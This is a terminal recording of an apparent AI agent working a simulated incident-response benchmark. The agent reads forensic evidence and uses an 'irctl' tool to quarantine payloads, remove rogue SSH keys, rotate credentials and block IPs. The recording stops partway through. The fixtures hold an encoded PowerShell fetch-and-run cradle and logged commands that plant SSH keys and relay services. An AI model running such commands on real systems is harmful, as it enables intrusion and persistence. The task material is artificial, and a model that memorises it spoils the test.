@@ -1,0 +1,1103 @@
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ asciinema rec --stdin /logs/agent/recording.cast
+[?2004l[0;32masciinema: recording asciicast to /logs/agent/recording.cast[0m
+[0;32masciinema: press <ctrl-d> or type "exit" when you're done[0m
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ clear
+[?2004l[H[J[3J[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ ls -la /evidence
+[?2004ltotal 44
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Sep 10 05:15 [01;34m..[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34malerts[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34mcmdb[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34mdocs[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34mfilesystem[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34mlinux[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34mmemory[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34mnetwork[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34mregistry[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34mwindows[0m
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ ls -la /evidence/docs
+[?2004ltotal 24
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [0m[01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34m..[0m
+-r--r--r-- 1 root root 1034 Aug 19 23:52 EVIDENCE_GUIDE.md
+-r--r--r-- 1 root root 1154 Aug 19 23:52 IRCTL.md
+-r--r--r-- 1 root root 5248 Sep 10 05:09 REPORT_SCHEMA.md
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/docs/IRCTL.md
+[?2004l# Response control contract
+
+`irctl status` prints current range state. `irctl help` prints command syntax.
+Identifiers accepted by commands are displayed by `status` and are stable for
+this captured range.
+
+Commands:
+
+- `irctl quarantine HOST ARTIFACT_ID`
+- `irctl disable-startup HOST ENTRY_ID`
+- `irctl remove-key HOST KEY_ID`
+- `irctl revoke-session SESSION_ID`
+- `irctl rotate-credential PRINCIPAL`
+- `irctl rebind-service SERVICE_ID PRINCIPAL`
+- `irctl block INDICATOR`
+- `irctl start-service HOST SERVICE_ID`
+- `irctl verify`
+
+Quarantine preserves evidence metadata while preventing execution. Disabling a
+startup entry preserves the record while preventing launch. Rotation creates a
+new credential version; dependent services do not recover until explicitly
+rebound to the current version. Removing a key affects only that key. Blocks are
+exact indicators, not CIDR rules.
+
+Each mutating command validates all arguments before a single atomic state-file
+replacement. Repeating an already-applied action is safe. The public `verify`
+checks general safety and service-binding invariants, but does not identify which
+items belong to this incident.
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/docs/REPORT_SCHEMA.md
+[?2004l# Incident report schema
+
+Write one JSON object to `/app/incident_report.json`. This is a controlled
+forensic finding format rather than a prose template. Use only the fields shown;
+unexpected fields are rejected so a label cannot be contradicted by an
+unstructured side claim. Array order is not significant.
+
+```json
+{
+  "case_id": "case identifier from the evidence",
+  "affected_hosts": ["host names assessed as compromised"],
+  "initial_access": {
+    "host": "host name",
+    "vector": "controlled label",
+    "execution": "controlled label",
+    "assessment": "confirmed_compromise|suspected|benign",
+    "evidence": [{"path": "relative/path", "locator": "unique record locator"}]
+  },
+  "lateral_movement": [
+    {
+      "source": "host name",
+      "destination": "host name",
+      "account": "principal",
+      "channel": "ssh|rdp|smb|winrm|api|other",
+      "assessment": "confirmed_compromise|suspected|benign",
+      "evidence": [{"path": "...", "locator": "..."}]
+    }
+  ],
+  "persistence": [
+    {
+      "host": "host name",
+      "kind": "registry_run|scheduled_task|systemd_service|systemd_timer|ssh_authorized_key|shell_profile|other",
+      "object": "concrete value name, unit, path, key fingerprint, or other captured identifier",
+      "effect": "execution|reentry",
+      "assessment": "malicious|suspicious|benign",
+      "evidence": [{"path": "...", "locator": "..."}]
+    }
+  ],
+  "timeline": [
+    {
+      "time_utc": "ISO-8601 UTC",
+      "kind": "initial_execution|credential_access|lateral_access|persistence_activation",
+      "evidence": [{"path": "...", "locator": "..."}]
+    }
+  ],
+  "indicators": [
+    {
+      "type": "ip|sha256|key_fingerprint",
+      "value": "normalized indicator",
+      "disposition": "hostile|suspicious|approved",
+      "evidence": [{"path": "...", "locator": "..."}]
+    }
+  ]
+}
+```
+
+Suggested `vector` labels are `malicious_document`, `drive_by_download`,
+`stolen_credential`, and `public_service_exploit`; suggested `execution` labels
+are `powershell`, `native_binary`, `script_interpreter`, and `remote_service`.
+Select the values supported by this case. Include every malicious persistence
+finding and a trusted hostile indicator set covering the initial payload, later
+payloads, attacker infrastructure, and re-entry material. You may additionally
+include other evidence-backed observed hashes, benign persistence/baseline
+objects, and approved IP, hash, or key-fingerprint indicators when they help
+document collateral-impact decisions; unsupported context is rejected.
+
+## Citation rules
+
+Each evidence object has exactly `path` and `locator`. `path` must be a regular
+file relative to `/evidence` (no absolute paths or `..`). `locator` must be a
+case-insensitive literal substring that uniquely selects one source record or
+line in that file, such as a record ID, full timestamp, fingerprint, hash, or
+distinctive log excerpt. Generic field names, headers, or repeated program
+names are not record locators. The selected records must contain the submitted
+host, time, object, channel, or indicator facts they support.
+
+`lateral_movement` contains one finding per evidence-supported hop in the causal
+chain. Lateral-movement and silent-persistence findings require corroboration
+from at least two independently produced source families. The four timeline `kind`
+values are lifecycle categories, not prescribed answers; each category needs at
+least one supported event and every distinct lateral hop needs its own
+`lateral_access` event. Additional distinct events are accepted when their
+timestamp occurs in the uniquely selected source record.
+
+Corroborating records may be cited elsewhere in the report; they need not be
+duplicated in every finding. They must join on the same host, payload, process,
+session, or principal. For example, a process/socket pair joins by host and PID;
+an SSH hop joins its source, destination, and account across observations.
+Unrelated records containing the same words do not corroborate a finding.
+Two observations of one SSH login do not establish two distinct lateral hops.
+A timeline label must describe the cited event's behavior, as well as its time;
+timestamps in a broad incident window alone do not establish that behavior.
+Equivalent ISO-8601 timestamps denoting the same instant are accepted.
+
+No particular source family, including a filesystem capture, is mandatory for
+malicious persistence findings. Independent records must jointly establish the
+identified mechanism: for a service, its activation and payload execution; for
+an SSH key, the key identity, account, and persistent access. Activation-audit
+and service-process observations may corroborate a service when their host and
+chronology agree. Authentication and key-addition audit observations may
+corroborate a key when the host and account agree. A process predating activation,
+an unrelated account's key addition, or two records from one source family do
+not supply that corroboration. Captured configuration with independent runtime
+or baseline evidence remains valid.
+
+Eradication, containment, trust rotation, collateral impact, and recovery are
+not self-attested in this report. They are graded directly from the mutable
+range state after your `irctl` actions.
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl status
+[?2004l{
+  "blocked_indicators": [],
+  "case_id": "FIN-2025-0417",
+  "credentials": {
+    "CORP\\backupsvc": {
+      "rotated": false,
+      "version": 7
+    },
+    "CORP\\svc_reporting": {
+      "rotated": false,
+      "version": 4
+    },
+    "CORP\\vaultsync": {
+      "rotated": false,
+      "version": 2
+    }
+  },
+  "hosts": {
+    "acct-ws-04": {
+      "artifacts": {
+        "FILE-221": {
+          "path": "C:\\ProgramData\\OneDriveHealth\\update.ps1",
+          "quarantined": false,
+          "sha256": "27c1b956a376f025da54daeae5b3f9b9d12af076646712a31f4963ee3f743b73"
+        },
+        "FILE-310": {
+          "path": "C:\\Program Files\\Ledger\\monthend.ps1",
+          "quarantined": false,
+          "sha256": "b31e25099d0655b31be09a37309a61ee67058988a85a1952afcb4428828a2313"
+        }
+      },
+      "ssh_keys": {},
+      "startup_entries": {
+        "HKCU-17": {
+          "command": "powershell.exe -File C:\\ProgramData\\OneDriveHealth\\update.ps1",
+          "enabled": true,
+          "kind": "registry_run",
+          "name": "OneDriveHealth"
+        },
+        "TASK-44": {
+          "command": "C:\\Program Files\\Ledger\\monthend.ps1",
+          "enabled": true,
+          "kind": "scheduled_task",
+          "name": "FinanceMonthEnd"
+        }
+      }
+    },
+    "backup-gw-02": {
+      "artifacts": {
+        "FILE-701": {
+          "path": "/usr/local/bin/vendor-inventory",
+          "quarantined": false,
+          "sha256": "9a02b89bc7d921bb7899da21a523c8aa1064a3d9029ce46b5003190b4ceea11d"
+        },
+        "FILE-914": {
+          "path": "/opt/cache/cert_sync.py",
+          "quarantined": false,
+          "sha256": "74f740bc25ef325f87c3d1db53c6f8bee500f7d5270e15857df24ac7a5b86e82"
+        }
+      },
+      "ssh_keys": {
+        "KEY-73": {
+          "comment": "ops@vault",
+          "fingerprint": "SHA256:f0nRq8M0P4KxZ3TSxq1U7vWlYVzwQbQzdN0cP6q2Y9A",
+          "present": true
+        },
+        "KEY-88": {
+          "comment": "deploy@acct-ws-04",
+          "fingerprint": "SHA256:Q7aP1Wz4kD9nY2cLm8oRf6vH3sJ5uX0eBqTtN4iKp6M",
+          "present": true
+        }
+      },
+      "startup_entries": {
+        "TIMER-12": {
+          "command": "/usr/local/bin/vendor-inventory --push 192.0.2.44",
+          "enabled": true,
+          "kind": "systemd_timer",
+          "name": "vendor-inventory.timer"
+        },
+        "UNIT-77": {
+          "command": "/usr/bin/python3 /opt/cache/cert_sync.py --relay",
+          "enabled": true,
+          "kind": "systemd_service",
+          "name": "cert-cache.service"
+        }
+      }
+    },
+    "report-db-01": {
+      "artifacts": {
+        "DBFILE-1": {
+          "path": "/usr/local/bin/reporting-api",
+          "quarantined": false,
+          "sha256": "24b812244356127685812661eb16412f1fde2c921870ac4984440f9c8ca2d19d"
+        }
+      },
+      "ssh_keys": {},
+      "startup_entries": {
+        "DB-11": {
+          "command": "/usr/local/bin/reporting-api",
+          "enabled": true,
+          "kind": "service",
+          "name": "reporting-api"
+        }
+      }
+    },
+    "vault-prx-03": {
+      "artifacts": {
+        "FILE-930": {
+          "path": "/usr/local/bin/vault-health",
+          "quarantined": false,
+          "sha256": "976fa9317978a4fc326b42a008f323e0782222049004c5783eb4e9b805cfbc36"
+        },
+        "FILE-931": {
+          "path": "/usr/local/libexec/.index-cache",
+          "quarantined": false,
+          "sha256": "5a1ab623fda7df3cda48fc2d29a914c17ae700b3ceb79589d18bbd111b7f402d"
+        }
+      },
+      "ssh_keys": {
+        "KEY-91": {
+          "comment": "archive-admin@corp",
+          "fingerprint": "SHA256:Vn5Rx1Tq8Ka3Lc7Ym2Wp9Hs4Df6Bj0ZuEe3Ni8Go1Cs",
+          "present": true
+        },
+        "KEY-94": {
+          "comment": "cache-maint@backup-gw-02",
+          "fingerprint": "SHA256:Zx4Kp9Vm2Qa7Nf6Rt1Yw8Hs3Lc5Db0GeUj4Mi7Po2As",
+          "present": true
+        }
+      },
+      "startup_entries": {
+        "UNIT-92": {
+          "command": "/usr/local/bin/vault-health --push 203.0.113.88",
+          "enabled": true,
+          "kind": "systemd_service",
+          "name": "vault-health.service"
+        },
+        "UNIT-93": {
+          "command": "/usr/local/libexec/.index-cache --sync",
+          "enabled": true,
+          "kind": "systemd_service",
+          "name": "index-cache.service"
+        }
+      }
+    }
+  },
+  "services": {
+    "archive-transfer": {
+      "credential_version": 2,
+      "host": "vault-prx-03",
+      "principal": "CORP\\vaultsync",
+      "status": "stopped"
+    },
+    "ledger-client": {
+      "credential_version": null,
+      "host": "acct-ws-04",
+      "principal": null,
+      "status": "stopped"
+    },
+    "nightly-backup": {
+      "credential_version": 7,
+      "host": "backup-gw-02",
+      "principal": "CORP\\backupsvc",
+      "status": "stopped"
+    },
+    "reporting-api": {
+      "credential_version": 4,
+      "host": "report-db-01",
+      "principal": "CORP\\svc_reporting",
+      "status": "running"
+    },
+    "vault-health": {
+      "credential_version": null,
+      "host": "vault-prx-03",
+      "principal": null,
+      "status": "running"
+    }
+  },
+  "sessions": {
+    "S-4101": {
+      "active": true,
+      "principal": "CORP\\backupsvc",
+      "source": "10.24.8.17"
+    },
+    "S-4302": {
+      "active": true,
+      "principal": "CORP\\vaultsync",
+      "source": "10.24.5.20"
+    },
+    "S-6200": {
+      "active": true,
+      "principal": "CORP\\svc_reporting",
+      "source": "10.24.5.31"
+    }
+  }
+}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/alerts/*
+[?2004l{"record_id":"EDR-1042","time_utc":"2025-04-17T09:12:14Z","host":"acct-ws-04","severity":"high","rule":"Office child process with encoded PowerShell","process":"powershell.exe","parent":"WINWORD.EXE","command_line":"powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAGEAcwBzAGUAdABzAC8AYgBvAG8AdABzAHQAcgBhAHAALgBkAGEAdAAnACkA","file_written":"C:\\ProgramData\\OneDriveHealth\\update.ps1","file_sha256":"27c1b956a376f025da54daeae5b3f9b9d12af076646712a31f4963ee3f743b73"}
+{"record_id":"EDR-1043","time_utc":"2025-04-17T09:13:02Z","host":"acct-ws-04","severity":"medium","rule":"Registry persistence","process":"powershell.exe","registry_path":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","value_name":"OneDriveHealth","value_data":"powershell.exe -File C:\\ProgramData\\OneDriveHealth\\update.ps1"}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ ls -la /evidence/cmdb
+[?2004ltotal 12
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [0m[01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34m..[0m
+-r--r--r-- 1 root root 2274 Aug 19 23:52 assets.json
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/cmdb/*
+[?2004l{
+  "captured_at": "2025-04-17T10:05:00Z",
+  "assets": [
+    {
+      "host": "acct-ws-04",
+      "ip": "10.24.8.17",
+      "role": "finance workstation",
+      "expected_services": [
+        "ledger-client"
+      ]
+    },
+    {
+      "host": "backup-gw-02",
+      "ip": "10.24.5.20",
+      "role": "backup gateway",
+      "expected_services": [
+        "nightly-backup"
+      ]
+    },
+    {
+      "host": "vault-prx-03",
+      "ip": "10.24.9.31",
+      "role": "archive indexing proxy",
+      "expected_services": [
+        "archive-transfer",
+        "vault-health"
+      ]
+    },
+    {
+      "host": "report-db-01",
+      "ip": "10.24.5.31",
+      "role": "report database",
+      "expected_services": [
+        "reporting-api"
+      ]
+    }
+  ],
+  "approved_external_destinations": [
+    {
+      "ip": "192.0.2.44",
+      "owner": "Northwind inventory partner",
+      "service": "vendor-inventory",
+      "port": 443
+    },
+    {
+      "ip": "203.0.113.88",
+      "owner": "Contoso archive monitor",
+      "service": "vault-health",
+      "port": 443
+    }
+  ],
+  "approved_ssh_keys": [
+    {
+      "host": "backup-gw-02",
+      "principal": "opsadmin",
+      "fingerprint": "SHA256:f0nRq8M0P4KxZ3TSxq1U7vWlYVzwQbQzdN0cP6q2Y9A",
+      "comment": "ops@vault"
+    },
+    {
+      "host": "vault-prx-03",
+      "principal": "archive-admin",
+      "fingerprint": "SHA256:Vn5Rx1Tq8Ka3Lc7Ym2Wp9Hs4Df6Bj0ZuEe3Ni8Go1Cs",
+      "comment": "archive-admin@corp"
+    }
+  ],
+  "service_accounts": [
+    {
+      "principal": "CORP\\backupsvc",
+      "services": [
+        "nightly-backup"
+      ],
+      "credential_version": 7
+    },
+    {
+      "principal": "CORP\\vaultsync",
+      "services": [
+        "archive-transfer"
+      ],
+      "credential_version": 2
+    },
+    {
+      "principal": "CORP\\svc_reporting",
+      "services": [
+        "reporting-api"
+      ],
+      "credential_version": 4
+    }
+  ],
+  "approved_startup": [
+    {
+      "host": "acct-ws-04",
+      "id": "TASK-44",
+      "purpose": "Finance month-end export"
+    },
+    {
+      "host": "backup-gw-02",
+      "id": "TIMER-12",
+      "purpose": "approved vendor inventory sync"
+    },
+    {
+      "host": "vault-prx-03",
+      "id": "UNIT-92",
+      "purpose": "approved archive health exporter"
+    }
+  ]
+}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ ls -la /evidence/windows
+[?2004ltotal 16
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [0m[01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34m..[0m
+-r--r--r-- 1 root root  643 Aug 19 23:52 security_events.jsonl
+-r--r--r-- 1 root root  456 Aug 19 23:52 sysmon.jsonl
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ ls -la /evidence/linux
+[?2004ltotal 24
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [0m[01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34m..[0m
+-r--r--r-- 1 root root 1023 Aug 19 23:52 backup-gw-02-audit.jsonl
+-r--r--r-- 1 root root  625 Aug 19 23:52 backup-gw-02-auth.log
+-r--r--r-- 1 root root  807 Aug 19 23:52 vault-prx-03-audit.jsonl
+-r--r--r-- 1 root root  342 Aug 19 23:52 vault-prx-03-auth.log
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/windows/security_events.jsonl
+[?2004l{"record_id":"WINSEC-8810","time_utc":"2025-04-17T09:16:41Z","host":"acct-ws-04","event_id":4648,"subject":"FINANCE\\mrivera","target_server":"backup-gw-02","target_account":"CORP\\backupsvc","process":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","source_ip":"10.24.8.17"}
+{"record_id":"WINSEC-8811","time_utc":"2025-04-17T09:17:06Z","host":"acct-ws-04","event_id":5140,"subject":"CORP\\backupsvc","share":"\\\\backup-gw-02\\ops$","source_ip":"10.24.8.17"}
+{"record_id":"WINSEC-8820","time_utc":"2025-04-17T09:31:00Z","host":"acct-ws-04","event_id":4624,"subject":"FINANCE\\mrivera","logon_type":2,"source_ip":"127.0.0.1"}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/windows/sysmon.jsonl
+[?2004l{"record_id":"SYSMON-2201","time_utc":"2025-04-17T09:12:15Z","host":"acct-ws-04","event_id":3,"image":"powershell.exe","destination_ip":"198.51.100.77","destination_port":80,"user":"FINANCE\\mrivera"}
+{"record_id":"SYSMON-2208","time_utc":"2025-04-17T09:16:39Z","host":"acct-ws-04","event_id":1,"image":"powershell.exe","command_line":"powershell.exe Get-Content C:\\ProgramData\\Ops\\backup-job.xml; ssh backupsvc@backup-gw-02","user":"FINANCE\\mrivera"}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/linux/backup-gw-02-auth.log
+[?2004l2025-04-17T08:40:03Z backup-gw-02 sshd[910]: Accepted publickey for opsadmin from 10.24.1.11 port 44002 ssh2: ED25519 SHA256:f0nRq8M0P4KxZ3TSxq1U7vWlYVzwQbQzdN0cP6q2Y9A
+2025-04-17T09:18:20Z backup-gw-02 sshd[1438]: Accepted publickey for backupsvc from 10.24.8.17 port 51812 ssh2: ED25519 SHA256:Q7aP1Wz4kD9nY2cLm8oRf6vH3sJ5uX0eBqTtN4iKp6M
+2025-04-17T09:18:21Z backup-gw-02 sshd[1438]: pam_unix(sshd:session): session opened for user backupsvc by (uid=0)
+2025-04-17T09:55:01Z backup-gw-02 sshd[1700]: Accepted publickey for opsadmin from 10.24.1.11 port 44119 ssh2: ED25519 SHA256:f0nRq8M0P4KxZ3TSxq1U7vWlYVzwQbQzdN0cP6q2Y9A
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/linux/backup-gw-02-audit.jsonl
+[?2004l{"record_id":"AUDIT-391","time_utc":"2025-04-17T09:19:44Z","host":"backup-gw-02","auid":"backupsvc","exe":"/usr/bin/install","command":"install -m 700 /tmp/cert_sync.py /opt/cache/cert_sync.py"}
+{"record_id":"AUDIT-392","time_utc":"2025-04-17T09:20:11Z","host":"backup-gw-02","auid":"backupsvc","exe":"/usr/bin/systemctl","command":"systemctl enable --now cert-cache.service"}
+{"record_id":"AUDIT-393","time_utc":"2025-04-17T09:21:08Z","host":"backup-gw-02","auid":"backupsvc","exe":"/usr/bin/sh","command":"sh -c cat /tmp/deploy.pub >> /home/backupsvc/.ssh/authorized_keys","object":"/home/backupsvc/.ssh/authorized_keys"}
+{"record_id":"AUDIT-394","time_utc":"2025-04-17T09:23:41Z","host":"backup-gw-02","auid":"backupsvc","exe":"/usr/bin/ssh","command":"ssh -i /opt/cache/.vault-stage vaultsync@10.24.9.31","principal":"CORP\\vaultsync"}
+{"record_id":"AUDIT-410","time_utc":"2025-04-17T09:40:00Z","host":"backup-gw-02","auid":"root","exe":"/usr/local/bin/vendor-inventory","command":"vendor-inventory --push 192.0.2.44"}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/linux/vault-prx-03-auth.log
+[?2004l2025-04-17T09:24:06Z vault-prx-03 sshd[3117]: Accepted publickey for vaultsync from 10.24.5.20 port 49221 ssh2: RSA SHA256:Zx4Kp9Vm2Qa7Nf6Rt1Yw8Hs3Lc5Db0GeUj4Mi7Po2As
+2025-04-17T09:52:00Z vault-prx-03 sshd[3801]: Accepted publickey for archive-admin from 10.24.9.40 port 50118 ssh2: ED25519 SHA256:Vn5Rx1Tq8Ka3Lc7Ym2Wp9Hs4Df6Bj0ZuEe3Ni8Go1Cs
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/linux/vault-prx-03-audit.jsonl
+[?2004l{"record_id":"VAUDIT-771","time_utc":"2025-04-17T09:25:02Z","host":"vault-prx-03","auid":"vaultsync","exe":"/usr/bin/install","command":"install -m 700 /tmp/.index-cache /usr/local/libexec/.index-cache"}
+{"record_id":"VAUDIT-772","time_utc":"2025-04-17T09:25:21Z","host":"vault-prx-03","auid":"vaultsync","exe":"/usr/bin/systemctl","command":"systemctl enable --now index-cache.service"}
+{"record_id":"VAUDIT-773","time_utc":"2025-04-17T09:26:04Z","host":"vault-prx-03","auid":"vaultsync","exe":"/usr/bin/sh","command":"cat /tmp/cache.pub >> /home/vaultsync/.ssh/authorized_keys","object":"/home/vaultsync/.ssh/authorized_keys"}
+{"record_id":"VAUDIT-810","time_utc":"2025-04-17T09:50:00Z","host":"vault-prx-03","auid":"root","exe":"/usr/local/bin/vault-health","command":"vault-health --push 203.0.113.88"}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/network/*
+[?2004lstart_time_utc,end_time_utc,src_ip,src_host,dst_ip,dst_host,dst_port,bytes_out,bytes_in
+2025-04-17T09:12:15Z,2025-04-17T09:12:18Z,10.24.8.17,acct-ws-04,198.51.100.77,external,80,1452,19044
+2025-04-17T09:18:19Z,2025-04-17T09:22:55Z,10.24.8.17,acct-ws-04,10.24.5.20,backup-gw-02,22,8241,12904
+2025-04-17T09:20:19Z,2025-04-17T09:47:00Z,10.24.5.20,backup-gw-02,203.0.113.201,external,443,17733,9201
+2025-04-17T09:23:45Z,2025-04-17T09:27:10Z,10.24.5.20,backup-gw-02,10.24.9.31,vault-prx-03,22,9188,14270
+2025-04-17T09:25:23Z,2025-04-17T09:48:00Z,10.24.9.31,vault-prx-03,198.51.100.203,external,8443,20114,7330
+2025-04-17T09:40:00Z,2025-04-17T09:40:04Z,10.24.5.20,backup-gw-02,192.0.2.44,external,443,700,1800
+2025-04-17T09:50:00Z,2025-04-17T09:50:04Z,10.24.9.31,vault-prx-03,203.0.113.88,external,443,620,1550
+2025-04-17T09:45:00Z,2025-04-17T09:45:02Z,10.24.5.31,report-db-01,10.24.5.20,backup-gw-02,5432,900,2100
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ cat /evidence/memory/*
+[?2004lpid,ppid,start_time_utc,user,image,command_line,sha256
+1,0,2025-04-17T07:00:00Z,root,systemd,/sbin/init,32b1e0c0d0d1740aa0f011c866f75f1967202255d649fc42ce81a5df7881ab23
+4412,1,2025-04-17T09:20:12Z,backupsvc,python3,/usr/bin/python3 /opt/cache/cert_sync.py --relay,74f740bc25ef325f87c3d1db53c6f8bee500f7d5270e15857df24ac7a5b86e82
+2280,1,2025-04-17T07:02:31Z,root,vendor-inventory,/usr/local/bin/vendor-inventory --daemon,9a02b89bc7d921bb7899da21a523c8aa1064a3d9029ce46b5003190b4ceea11d
+snapshot_time_utc,pid,process,local,remote,state
+2025-04-17T09:47:00Z,4412,python3,10.24.5.20:45518,203.0.113.201:443,ESTABLISHED
+2025-04-17T09:47:00Z,2280,vendor-inventory,10.24.5.20:38820,192.0.2.44:443,ESTABLISHED
+2025-04-17T09:47:00Z,501,sshd,10.24.5.20:22,10.24.1.11:44119,ESTABLISHED
+pid,ppid,user,start_time_utc,exe,command_line,sha256
+1,0,root,2025-04-12T07:00:00Z,/usr/lib/systemd/systemd,/sbin/init,202557e6f798cfce30cf0952bb913f2c5e46d77f489abdc2b35d86e34be83351
+7721,1,root,2025-04-17T09:25:21Z,/usr/local/libexec/.index-cache,/usr/local/libexec/.index-cache --sync,5a1ab623fda7df3cda48fc2d29a914c17ae700b3ceb79589d18bbd111b7f402d
+8090,1,monitor,2025-04-17T09:50:00Z,/usr/local/bin/vault-health,/usr/local/bin/vault-health --push 203.0.113.88,976fa9317978a4fc326b42a008f323e0782222049004c5783eb4e9b805cfbc36
+pid,process,local,remote,state,first_seen_utc
+7721,.index-cache,10.24.9.31:46310,198.51.100.203:8443,ESTABLISHED,2025-04-17T09:25:23Z
+8090,vault-health,10.24.9.31:47202,203.0.113.88:443,ESTABLISHED,2025-04-17T09:50:00Z
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ head -n 5 /case/live/state.json
+[?2004l{
+  "blocked_indicators": [],
+  "case_id": "FIN-2025-0417",
+  "credentials": {
+    "CORP\\backupsvc": {
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ ls -la /evidence/alerts
+[?2004ltotal 12
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [0m[01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 19 23:52 [01;34m..[0m
+-r--r--r-- 1 root root  966 Aug 19 23:52 edr_alerts.jsonl
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl quarantine acct-ws-04 FILE-14
+[?2004lirctl: unknown artifact on acct-ws-04: FILE-14
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl disable-startup acct-ws-04 HKCU-17
+[?2004l{"command": "disable-startup", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl quarantine backup-gw-02 FILE-914
+[?2004lirctl quarantine vault-prx-03 FILE-931
+irctl disable-startup vault-prx-03 UNIT-93
+irctl remove-key vault-prx-03 KEY-94
+{"command": "quarantine", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl disable-startup backup-gw-02 UNIT-77
+[?2004l{"command": "disable-startup", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl remove-key backup-gw-02 KEY-88
+[?2004l{"command": "remove-key", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl quarantine vault-prx-03 FILE-931
+[?2004lirctl revoke-session S-4101
+irctl revoke-session S-4302
+irctl rotate-credential 'CORP\backupsvc'
+irctl rotate-credential 'CORP\vaultsync'
+{"command": "quarantine", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl disable-startup vault-prx-03 UNIT-93
+[?2004l{"command": "disable-startup", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl remove-key vault-prx-03 KEY-94
+[?2004lirctl rebind-service nightly-backup 'CORP\backupsvc'
+irctl rebind-service archive-transfer 'CORP\vaultsync'
+irctl start-service acct-ws-04 ledger-client
+irctl start-service backup-gw-02 nightly-backup
+irctl start-service vault-prx-03 archive-transfer
+{"command": "remove-key", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl revoke-session S-4101
+[?2004l{"command": "revoke-session", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl revoke-session S-4302
+[?2004l{"command": "revoke-session", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl rotate-credential 'CORP\backupsvc'
+[?2004lirctl block 198.51.100.77
+irctl block 203.0.113.201
+irctl block 198.51.100.203
+irctl verify
+{"command": "rotate-credential", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl rotate-credential 'CORP\vaultsync'
+[?2004l{"command": "rotate-credential", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl rebind-service nightly-backup 'CORP\backupsvc'
+[?2004l{"command": "rebind-service", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl rebind-service archive-transfer 'CORP\vaultsync'
+[?2004l{"command": "rebind-service", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl start-service acct-ws-04 ledger-client
+[?2004l{"command": "start-service", "ok": true}
+[?2004h[01;32msolver@710f9c04952a[00m:[01;34m/app[00m$ irctl start-service backup-gw-02 nightly-backup
